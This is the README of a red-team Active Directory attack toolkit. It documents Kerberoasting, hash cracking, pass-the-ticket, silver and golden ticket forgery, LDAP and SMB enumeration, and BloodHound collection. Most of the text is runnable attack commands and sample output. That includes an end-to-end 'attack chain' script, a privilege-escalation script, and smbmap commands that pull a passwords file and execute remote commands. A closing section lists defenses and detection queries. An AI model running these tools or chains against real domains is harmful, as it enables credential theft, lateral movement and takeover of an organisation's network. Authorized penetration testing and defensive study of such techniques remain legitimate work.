# Active Directory Attack & Enumeration Toolkit

Advanced Python scripts for Active Directory security testing, including Kerberoasting, Pass-the-Ticket, LDAP enumeration, BloodHound data collection, and SMB share enumeration. Part of the Red Team Security Testing Toolkit.


## 📋 Tools Overview

| # | Tool | Category | Purpose |
|---|------|----------|---------|
| 27 | `kerberoasting.py` | Credential Access | Service account hash extraction via Kerberos |
| 28 | `pass_the_ticket.py` | Lateral Movement | Ticket extraction, import, and reuse |
| 29 | `ldap_enumerator.py` | Discovery | Comprehensive LDAP/AD enumeration |
| 30 | `ad_collector.py` | Collection | BloodHound data collection & SMB enumeration |

---

## 🚀 Installation

### Prerequisites

- **Python 3.8+** (3.10+ recommended)
- **pip** (latest version)
- **Domain credentials** (for most operations)
- **Network access** to Domain Controller

### Quick Install

```bash
# Clone the toolkit repository
git clone https://github.com/your-repo/redteam-web-toolkit.git
cd redteam-web-toolkit

# Install all dependencies
pip install -r requirements-ad.txt
```

### Tool-Specific Dependencies

#### Kerberoasting (`kerberoasting.py`)

```bash
# Core dependency - Impacket
pip install impacket

# Alternative installation methods:
# From Kali Linux:
sudo apt-get install python3-impacket

# From source:
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .

# For hash cracking (separate tools):
# hashcat: https://hashcat.net/hashcat/
# john: sudo apt-get install john
```

#### Pass-the-Ticket (`pass_the_ticket.py`)

```bash
# Core dependencies
pip install impacket ldap3

# For WinRM support
pip install pywinrm

# For Kerberos tools
sudo apt-get install krb5-user krb5-config

# Configure Kerberos
sudo nano /etc/krb5.conf
```

#### LDAP Enumerator (`ldap_enumerator.py`)

```bash
# Core dependency
pip install ldap3>=2.9.1

# Optional for enhanced output
pip install colorama prettytable
```

#### AD Collector (`ad_collector.py`)

```bash
# BloodHound.py
pip install bloodhound

# Or from source:
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
pip install .

# SMBMap
pip install smbmap

# Or from source:
git clone https://github.com/ShawnDEvans/smbmap.git
cd smbmap
pip install .

# Impacket (for manual SMB enumeration)
pip install impacket

# smbclient (system package)
sudo apt-get install smbclient
```

### Complete Requirements File

Create `requirements-ad.txt`:

```txt
# Impacket - Kerberos/SMB protocols
impacket>=0.10.0

# LDAP3 - LDAP client
ldap3>=2.9.1

# BloodHound - AD data collection
bloodhound>=1.5.0

# SMBMap - SMB enumeration
smbmap>=1.9.0

# Additional utilities
pywinrm>=0.4.0
pyOpenSSL>=23.0.0
cryptography>=39.0.0
ldapdomaindump>=0.9.4
dnspython>=2.3.0
colorama>=0.4.6
prettytable>=3.0.0
```

### Platform-Specific Setup

#### Kali Linux

```bash
# Kali comes with most tools pre-installed
sudo apt-get update
sudo apt-get install -y \
    python3-impacket \
    bloodhound \
    smbmap \
    ldap-utils \
    krb5-user \
    smbclient

# Install Python packages
pip install ldap3 pywinrm
```

#### Ubuntu/Debian

```bash
# Install system dependencies
sudo apt-get update
sudo apt-get install -y \
    python3 python3-pip python3-dev \
    build-essential libssl-dev libffi-dev \
    krb5-user smbclient ldap-utils

# Install Python packages
pip install -r requirements-ad.txt

# Configure Kerberos
sudo dpkg-reconfigure krb5-config
```

#### macOS

```bash
# Using Homebrew
brew install python3
brew install krb5 openldap

# Install Python packages
pip3 install -r requirements-ad.txt

# Configure Kerberos
# Edit /etc/krb5.conf with domain information
```

#### Windows

```bash
# Install Python from python.org
# Run as Administrator for some operations

# Install dependencies
pip install -r requirements-ad.txt

# Note: Some features require WSL or Linux VM
# Consider using Kali Linux VM for full functionality
```

### Verify Installation

```bash
# Test Impacket
python3 -c "from impacket.krb5 import constants; print('Impacket OK')"

# Test LDAP3
python3 -c "from ldap3 import Server, Connection; print('LDAP3 OK')"

# Test BloodHound
bloodhound-python --version

# Test SMBMap
smbmap --version

# Test Kerberos
klist
```

---

## 📖 Tool 27: Kerberoasting

### Purpose
Extract and crack Kerberos service account tickets to obtain plaintext credentials for domain accounts with Service Principal Names (SPNs).

### Key Capabilities

#### 🎯 Attack Methods
- **TGS Request** - Request service tickets for SPN accounts
- **Weak Encryption** - Force RC4/DES encryption for easier cracking
- **AS-REP Roasting** - Attack accounts without pre-authentication
- **Multiple SPN Types** - Target various service types automatically

#### 🔐 Hash Extraction
- **Hashcat Format** - Direct compatibility with hashcat
- **John Format** - Direct compatibility with John the Ripper
- **Multiple Encryption Types** - RC4, DES, AES support
- **Automatic Format Detection** - Proper hash formatting

#### 📊 Service Discovery
- **Common SPN Search** - MSSQL, HTTP, CIFS, LDAP, etc.
- **Custom SPN Targets** - User-defined service types
- **Service Account Identification** - Distinguish from user accounts

### Usage

#### Basic Kerberoasting

```bash
# With password
python kerberoasting.py domain.local username password123

# With NTLM hash (Pass-the-Hash)
python kerberoasting.py domain.local username --hashes aad3b435b51404eeaad3b435b51404ee:ntlm_hash
```

#### Programmatic Usage

```python
from kerberoasting import Kerberoaster

# Initialize
roaster = Kerberoaster(
    domain='domain.local',
    username='user',
    password='password123',
    dc_ip='192.168.1.10'
)

# Execute attack
roaster.execute()

# Access results
print(roaster.results['extracted_tickets'])
print(roaster.results['crackable_hashes'])
```

### Expected Output

```
[*] Starting Kerberoasting Attack
[*] Domain: DOMAIN.LOCAL
[*] User: jsmith

[*] Getting TGT...
[+] TGT obtained for jsmith@DOMAIN.LOCAL

[*] Finding service accounts...
    Found 5 service accounts

[*] Requesting service tickets...
    [+] MSSQLSvc/sql01.domain.local (rc4_hmac)
    [+] HTTP/web01.domain.local (rc4_hmac)
    [+] cifs/file01.domain.local (rc4_hmac)
    [+] TERMSRV/ts01.domain.local (des_cbc_crc)

[*] Saving hashes for cracking...
[+] Hash files saved:
    - kerberoast_hashes.hashcat (hashcat format)
    - kerberoast_hashes.john (John format)

[*] Cracking commands:
    hashcat -m 13100 kerberoast_hashes.hashcat wordlist.txt
    john --format=krb5tgs kerberoast_hashes.john --wordlist=wordlist.txt

============================================================
KERBEROASTING SUMMARY
============================================================
Service Accounts Found: 5
Tickets Extracted: 4
AS-REP Roastable: 0

[+] Report saved to kerberoasting_report.json
```

### Hash Cracking

```bash
# Using hashcat
hashcat -m 13100 kerberoast_hashes.hashcat /usr/share/wordlists/rockyou.txt --force

# Using John
john --format=krb5tgs kerberoast_hashes.john --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
hashcat -m 13100 kerberoast_hashes.hashcat --show
john --show kerberoast_hashes.john
```

### Hash Formats

```
# Hashcat Mode 13100 (RC4)
$krb5tgs$23$*user$DOMAIN.LOCAL$MSSQLSvc/sql01.domain.local*$hash1$hash2

# Hashcat Mode 18200 (AS-REP)
$krb5asrep$23$user@DOMAIN.LOCAL:hash1$hash2
```

### Attack Indicators

| Indicator | Detection | Mitigation |
|-----------|-----------|------------|
| Event ID 4769 | TGS request | Monitor for unusual SPN requests |
| RC4 encryption | Weak encryption | Use AES encryption for service accounts |
| Multiple TGS requests | Enumeration | Limit TGS request rate |

---

## 📖 Tool 28: Pass-the-Ticket

### Purpose
Extract, import, and reuse Kerberos tickets for lateral movement and privilege escalation without knowing plaintext passwords.

### Key Capabilities

#### 🎫 Ticket Operations
- **Memory Extraction** - Extract tickets from Linux/Win memory
- **Ticket Import** - Import tickets into current session
- **Ticket Validation** - Verify ticket validity and expiration
- **Ticket Creation** - Silver and Golden ticket generation

#### 🔄 Service Access
- **SMB Access** - Use ticket for SMB file share access
- **LDAP Queries** - Authenticate to LDAP with ticket
- **WinRM Access** - Remote PowerShell with ticket
- **RDP Access** - Remote desktop with Kerberos

#### 🏆 Advanced Attacks
- **Silver Ticket** - Service-specific ticket forgery
- **Golden Ticket** - Domain-wide ticket forgery
- **Ticket Harvesting** - Collect tickets from multiple sources
- **Cross-Domain** - Inter-realm ticket usage

### Usage

#### Ticket Import and Usage

```bash
# Import ticket and access target
python pass_the_ticket.py domain.local dc01.domain.local /tmp/krb5cc_0

# Extract tickets from memory
python pass_the_ticket.py domain.local dc01.domain.local
```

#### Programmatic Usage

```python
from pass_the_ticket import PassTheTicket

# Initialize
ptt = PassTheTicket('domain.local', 'dc01.domain.local')

# Extract tickets
ptt.extract_tickets_from_memory()

# Import and use ticket
ticket_file = '/tmp/krb5cc_0'
ptt.import_ticket(ticket_file)
ptt.pass_the_ticket_smb(ticket_file, 'dc01.domain.local')
ptt.pass_the_ticket_ldap(ticket_file, 'dc01.domain.local')

# Create Silver Ticket
ptt.create_silver_ticket(
    username='Administrator',
    service='cifs',
    target_host='dc01.domain.local',
    nt_hash='ntlm_hash',
    sid='S-1-5-21-...'
)
```

### Expected Output

```
[*] Starting Pass-the-Ticket Attack
[*] Domain: DOMAIN.LOCAL
[*] Target: dc01.domain.local

[*] Extracting tickets from memory...
    [+] Found: /tmp/krb5cc_1000
    [+] Found: /etc/krb5.keytab

[*] Importing ticket: /tmp/krb5cc_1000
    [+] Ticket imported successfully
    Principal: jsmith@DOMAIN.LOCAL
    Service: krbtgt/DOMAIN.LOCAL
    Valid until: 2024-01-15 10:00:00

[*] Using ticket for SMB access to dc01.domain.local
    [+] SMB authentication successful!
    [*] Available shares:
        - NETLOGON
        - SYSVOL
        - Users
        - Shared

[*] Using ticket for LDAP access to dc01.domain.local
    [+] LDAP authentication successful!
    [*] Found 245 users

============================================================
PASS-THE-TICKET SUMMARY
============================================================
Tickets Extracted: 2
Tickets Imported: 1
Successful Auths: 2

[+] Report saved to pass_the_ticket_report.json
```

### Ticket Types

| Ticket Type | Source | Scope | Duration |
|-------------|--------|-------|----------|
| TGT | Authentication | Entire domain | 10 hours |
| TGS | Service access | Single service | 10 hours |
| Silver Ticket | Forged (service hash) | Single service | Unlimited |
| Golden Ticket | Forged (krbtgt hash) | Entire domain | Unlimited |

### Silver Ticket Creation

```python
# Requirements:
# - Service account NT hash
# - Domain SID
# - Service principal name

ptt.create_silver_ticket(
    username='Administrator',
    service='cifs',           # Target service
    target_host='dc01.domain.local',
    nt_hash='aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c',
    sid='S-1-5-21-123456789-1234567890-123456789'
)
```

### Golden Ticket Creation

```python
# Requirements:
# - krbtgt NT hash
# - Domain SID
# - Domain Admin privileges

ptt.create_golden_ticket(
    username='Administrator',
    krbtgt_hash='krbtgt_nt_hash',
    domain_sid='S-1-5-21-123456789-1234567890-123456789'
)
```

---

## 📖 Tool 29: LDAP Enumerator

### Purpose
Comprehensive Active Directory enumeration via LDAP queries, extracting users, groups, computers, GPOs, trusts, and identifying security vulnerabilities.

### Key Capabilities

#### 👥 User Enumeration
- **All Domain Users** - Complete user listing with attributes
- **Service Accounts** - Identify accounts with SPNs
- **Administrators** - Find all privileged accounts
- **User Properties** - 20+ attributes per user
- **Account Status** - Disabled, expired, locked out

#### 🖥️ Computer Enumeration
- **Domain Computers** - All computer objects
- **Operating Systems** - OS version distribution
- **Domain Controllers** - DC identification
- **Stale Computers** - Inactive machines

#### 🔐 Security Analysis
- **AS-REP Roastable** - Users without pre-authentication
- **Unconstrained Delegation** - High-risk computers
- **Privileged Groups** - Admin group membership
- **Password Policy** - Domain password requirements
- **Trust Relationships** - Inter-domain trusts

#### 📋 Group Policy
- **GPO Enumeration** - All Group Policy Objects
- **OU Structure** - Organizational Unit hierarchy
- **ACL Analysis** - Interesting access controls

### Usage

#### Basic LDAP Enumeration

```bash
# Anonymous enumeration (limited)
python ldap_enumerator.py domain.local 192.168.1.10

# Authenticated enumeration
python ldap_enumerator.py domain.local 192.168.1.10 username password
```

#### Programmatic Usage

```python
from ldap_enumerator import LDAPEnumerator

# Initialize
enumerator = LDAPEnumerator(
    server='192.168.1.10',
    domain='domain.local',
    username='jsmith',
    password='password123',
    use_ssl=False
)

# Run complete enumeration
enumerator.run_all()

# Access specific results
print(enumerator.results['users'][:10])
print(enumerator.results['domain_admins'])
print(enumerator.results['vulnerabilities'])
```

### Expected Output

```
[*] Starting LDAP Enumeration
[*] Domain: domain.local
[*] Server: 192.168.1.10

[*] Connecting to 192.168.1.10...
[+] Connected successfully
    Server: Windows Server 2019

[*] Enumerating domain information...
    Domain Controllers: 2
        - DC01.domain.local (Windows Server 2019)
        - DC02.domain.local (Windows Server 2019)
    Password Policy:
        - Min Length: 8
        - Max Age: 42 days
        - Lockout: 5 attempts

[*] Enumerating users...
    Total Users: 1,245
    Service Accounts: 23
    Admin Accounts: 15

[*] Enumerating groups...
    Total Groups: 89
    Admin Groups: 12

[*] Enumerating computers...
    Total Computers: 456
        Windows 10: 342
        Windows Server 2019: 45
        Windows Server 2016: 38
        Windows 11: 31

[*] Checking delegation...
    [!] Unconstrained Delegation: WEB01.domain.local
    [!] Unconstrained Delegation: SQL01.domain.local

[*] Finding AS-REP roastable users...
    [!] AS-REP Roastable: svc_backup
    [!] AS-REP Roastable: svc_monitor

============================================================
LDAP ENUMERATION SUMMARY
============================================================
Total Users: 1,245
Service Accounts: 23
Domain Admins: 15
Total Groups: 89
Total Computers: 456
Vulnerabilities: 4

[+] Reports saved:
    - ldap_enum_report.json
    - domain_users.txt
    - domain_computers.txt
```

### Extracted User Attributes

| Attribute | Description | Example |
|-----------|-------------|---------|
| sAMAccountName | Login name | jsmith |
| userPrincipalName | Email-style login | jsmith@domain.local |
| memberOf | Group memberships | CN=Domain Admins,... |
| userAccountControl | Account flags | 512 (Normal) |
| pwdLastSet | Last password change | 2024-01-01 |
| lastLogon | Last login timestamp | 2024-01-15 |
| servicePrincipalName | Service SPNs | HTTP/web01.domain.local |
| adminCount | Admin flag | 1 (Admin) |

### UserAccountControl Flags

| Flag | Value | Description |
|------|-------|-------------|
| ACCOUNTDISABLE | 2 | Account disabled |
| PASSWD_NOTREQD | 32 | No password required |
| PASSWD_CANT_CHANGE | 64 | Cannot change password |
| DONT_EXPIRE_PASSWD | 65536 | Password never expires |
| TRUSTED_FOR_DELEGATION | 524288 | Unconstrained delegation |
| NOT_DELEGATED | 1048576 | Sensitive, cannot delegate |
| DONT_REQ_PREAUTH | 4194304 | No pre-authentication (AS-REP roastable) |

---

## 📖 Tool 30: AD Collector (BloodHound + SMB)

### Purpose
Combined tool for BloodHound data collection and comprehensive SMB share enumeration, providing attack path analysis and file share discovery.

### Key Capabilities

#### 🩸 BloodHound Collection
- **Automated Collection** - All collection methods
- **BloodHound.py Integration** - Python-native collection
- **ZIP Output** - Ready for BloodHound import
- **Multiple Methods** - Group, Session, ACL, Trust

#### 📁 SMB Enumeration
- **Share Discovery** - List all SMB shares
- **Access Testing** - Check read/write permissions
- **Content Listing** - Recursive file enumeration
- **Sensitive Files** - Identify interesting files
- **Multiple Tools** - SMBMap, Impacket, smbclient

### Usage

#### BloodHound Collection

```bash
# Collect all data
python ad_collector.py bloodhound domain.local username password 192.168.1.10

# Specific collection method
python ad_collector.py bloodhound domain.local username password 192.168.1.10 --method Group
```

#### SMB Enumeration

```bash
# Null session (if allowed)
python ad_collector.py smb 192.168.1.10

# Authenticated
python ad_collector.py smb 192.168.1.10 username password domain.local
```

### Expected Output

#### BloodHound Collection

```
[*] BloodHound Data Collection
[*] Domain: domain.local
[*] Method: All

[*] Collecting data with BloodHound.py...
[+] Collection successful!
    Output: 20240115_domain.local.zip

[*] Next Steps:
    1. Start Neo4j: sudo neo4j start
    2. Start BloodHound: bloodhound
    3. Import ZIP file into BloodHound
    4. Run queries:
       - Find Shortest Paths to Domain Admins
       - Find Principals with DCSync Rights
       - Find Computers with Unconstrained Delegation
```

#### SMB Enumeration

```
[*] SMB Share Enumeration
[*] Target: 192.168.1.10

[*] Enumerating shares with SMBMap...
    Found 8 shares
    [+] ADMIN$: READ, WRITE
    [+] C$: READ, WRITE
    [+] IPC$: READ
    [+] NETLOGON: READ
    [+] SYSVOL: READ
    [+] Users: READ
    [+] Shared: READ, WRITE
    [+] IT: READ, WRITE

[*] Searching for sensitive files...
    [!] Sensitive file found in Shared
        Shared\Finance\passwords.xlsx
    [!] Sensitive file found in IT
        IT\Scripts\credentials.ps1
    [!] Sensitive file found in Users
        Users\jsmith\.ssh\id_rsa

============================================================
SMB ENUMERATION SUMMARY
============================================================
Total Shares: 8
Accessible Shares: 8
Sensitive Files Found: 3

[+] SMB report saved to smb_enum_report.json
```

### BloodHound Analysis Queries

After importing data into BloodHound, run these queries:

```cypher
// Find paths to Domain Admins
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}))
RETURN p

// Find Kerberoastable users
MATCH (u:User {hasspn:true})
RETURN u.name, u.serviceprincipalnames

// Find computers with Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name

// Find users with AS-REP roastable
MATCH (u:User {dontreqpreauth:true})
RETURN u.name

// Find DCSync rights
MATCH (u:User)-[:GetChangesAll]->(d:Domain)
RETURN u.name
```

---

## 🔧 Advanced Configuration

### Kerberos Configuration

Create `/etc/krb5.conf`:

```ini
[libdefaults]
    default_realm = DOMAIN.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    DOMAIN.LOCAL = {
        kdc = dc01.domain.local
        admin_server = dc01.domain.local
    }

[domain_realm]
    .domain.local = DOMAIN.LOCAL
    domain.local = DOMAIN.LOCAL
```

### LDAP Connection Options

```python
# Standard LDAP (389)
enumerator = LDAPEnumerator('192.168.1.10', 'domain.local')

# LDAPS (636)
enumerator = LDAPEnumerator('192.168.1.10', 'domain.local', use_ssl=True)

# With different authentication
from ldap3 import NTLM, SIMPLE

conn = Connection(
    server,
    user='DOMAIN\\username',
    password='password',
    authentication=NTLM  # or SIMPLE
)
```

### SMB Enumeration Options

```bash
# Recursive listing (depth control)
smbmap -H 192.168.1.10 -u user -p pass -R Shared --depth 3

# Download files
smbmap -H 192.168.1.10 -u user -p pass --download "Shared\\passwords.xlsx"

# Execute command
smbmap -H 192.168.1.10 -u user -p pass -x "whoami"
```

---

## 📊 Attack Chain Examples

### Full AD Attack Chain

```bash
#!/bin/bash
# ad_attack_chain.sh

DOMAIN="domain.local"
DC_IP="192.168.1.10"
USER="jsmith"
PASS="password123"

echo "[*] Starting AD Attack Chain"

# Phase 1: LDAP Enumeration
echo "[Phase 1] LDAP Enumeration"
python ldap_enumerator.py $DOMAIN $DC_IP $USER $PASS

# Phase 2: BloodHound Collection
echo "[Phase 2] BloodHound Collection"
python ad_collector.py bloodhound $DOMAIN $USER $PASS $DC_IP

# Phase 3: Kerberoasting
echo "[Phase 3] Kerberoasting"
python kerberoasting.py $DOMAIN $USER $PASS

# Phase 4: SMB Enumeration
echo "[Phase 4] SMB Enumeration"
python ad_collector.py smb $DC_IP $USER $PASS $DOMAIN

# Phase 5: Crack Hashes (if any)
if [ -f kerberoast_hashes.hashcat ]; then
    echo "[Phase 5] Cracking hashes"
    hashcat -m 13100 kerberoast_hashes.hashcat /usr/share/wordlists/rockyou.txt --force
fi

echo "[*] Attack chain complete"
echo "[*] Review generated reports"
```

### Privilege Escalation Path

```python
from ldap_enumerator import LDAPEnumerator
from kerberoasting import Kerberoaster
from pass_the_ticket import PassTheTicket

def escalate_privileges():
    domain = "domain.local"
    dc = "192.168.1.10"
    
    # 1. Enumerate domain
    ldap = LDAPEnumerator(dc, domain, 'user', 'pass')
    ldap.run_all()
    
    # 2. Kerberoast service accounts
    roaster = Kerberoaster(domain, 'user', 'pass', dc_ip=dc)
    roaster.execute()
    
    # 3. After cracking, use service account
    ptt = PassTheTicket(domain, dc)
    ptt.import_ticket('/tmp/krb5cc_svc')
    ptt.pass_the_ticket_smb('/tmp/krb5cc_svc', dc)
    
    # 4. If service account is Domain Admin
    # Extract krbtgt hash for Golden Ticket
    # ptt.create_golden_ticket('Administrator', 'krbtgt_hash', 'S-1-5-21-...')

if __name__ == "__main__":
    escalate_privileges()
```

---

## 🛡️ Defense Recommendations

### Against Kerberoasting

1. **Use Strong Service Account Passwords**
   - Minimum 25+ character passwords
   - Use Group Managed Service Accounts (gMSA)
   - Rotate passwords regularly

2. **Use AES Encryption**
   ```powershell
   # Set AES encryption for service account
   Set-ADUser svc_account -KerberosEncryptionType AES256
   ```

3. **Monitor for Kerberoasting**
   ```
   # Event ID 4769 with RC4 encryption
   # Multiple TGS requests from single user
   # Requests for unusual SPNs
   ```

4. **Detect with Splunk**
   ```spl
   index=windows EventCode=4769
   | where TicketEncryptionType="0x17"  # RC4
   | stats count by ServiceName, AccountName
   ```

### Against Pass-the-Ticket

1. **Enable Windows Defender Credential Guard**
2. **Use Protected Users Group**
3. **Implement Privileged Access Workstations (PAW)**
4. **Monitor for Suspicious Ticket Usage**
   ```
   # Event ID 4768 with unusual IP addresses
   # Event ID 4769 for services not normally accessed
   ```

### Against LDAP Enumeration

1. **Limit Anonymous LDAP Access**
2. **Implement LDAP signing**
3. **Monitor LDAP Query Patterns**
   ```
   # Large numbers of LDAP queries
   # Queries for sensitive attributes
   ```

### Against SMB Enumeration

1. **Disable SMBv1**
2. **Enable SMB Signing**
3. **Restrict Null Sessions**
4. **Implement Least Privilege for Shares**

---

## 🐛 Troubleshooting

### Common Issues

#### 1. Impacket Installation Fails

```bash
# Solution 1: Install from GitHub
pip install git+https://github.com/SecureAuthCorp/impacket.git

# Solution 2: Use system package
sudo apt-get install python3-impacket

# Solution 3: Virtual environment
python -m venv venv
source venv/bin/activate
pip install impacket
```

#### 2. Kerberos Clock Skew

```bash
# Synchronize time with domain controller
sudo ntpdate -s dc01.domain.local

# Or use timedatectl
sudo timedatectl set-ntp true
```

#### 3. LDAP Connection Refused

```bash
# Test connectivity
nc -zv 192.168.1.10 389

# Check firewall rules
# Try LDAPS (636)
python ldap_enumerator.py domain.local 192.168.1.10 --ssl
```

#### 4. BloodHound Import Errors

```bash
# Clear Neo4j database
sudo neo4j stop
sudo rm -rf /var/lib/neo4j/data/databases/graph.db
sudo neo4j start

# Check Java version
java -version  # Need Java 11+

# Reset BloodHound database
cypher-shell -u neo4j -p password "MATCH (n) DETACH DELETE n"
```

#### 5. SMB Access Denied

```bash
# Test with smbclient
smbclient -L //192.168.1.10 -U username

# Check SMB version
nmap -p445 --script smb-protocols 192.168.1.10

# Try different authentication
smbmap -H 192.168.1.10 -u username -p password -d domain.local
```

---

## 📈 Output Files Reference

| Tool | Output File | Content |
|------|------------|---------|
| Kerberoasting | `kerberoast_hashes.hashcat` | TGS hashes (hashcat format) |
| Kerberoasting | `kerberoast_hashes.john` | TGS hashes (John format) |
| Kerberoasting | `asrep_hashes.hashcat` | AS-REP hashes |
| Kerberoasting | `kerberoasting_report.json` | Full attack report |
| Pass-the-Ticket | `pass_the_ticket_report.json` | Ticket usage report |
| LDAP Enumerator | `ldap_enum_report.json` | Complete AD enumeration |
| LDAP Enumerator | `domain_users.txt` | User list (one per line) |
| LDAP Enumerator | `domain_computers.txt` | Computer list (one per line) |
| AD Collector | `*.zip` | BloodHound data (timestamped) |
| AD Collector | `smb_enum_report.json` | SMB enumeration report |

---


### Adding New Enumeration Types

```python
# Example: Adding DNS enumeration
def enumerate_dns_records(self):
    self.conn.search(
        self.base_dn,
        '(objectClass=dnsNode)',
        attributes=['dnsRecord', 'name']
    )
    # Process DNS records...
```

---

## 📄 License

MIT License - See LICENSE file for details.

## 🙏 Acknowledgments

- SecureAuth for Impacket library
- BloodHound team for AD attack path analysis
- harmj0y for PowerView and AD enumeration techniques
- Active Directory security research community

## 📚 Resources

- [MITRE ATT&CK - Credential Access](https://attack.mitre.org/tactics/TA0006/)
- [MITRE ATT&CK - Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [Kerberoasting Explained](https://www.harmj0y.net/blog/activedirectory/kerberoasting/)
- [Pass-the-Ticket Attacks](https://attack.mitre.org/techniques/T1550/003/)
- [AD Security Best Practices](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices)

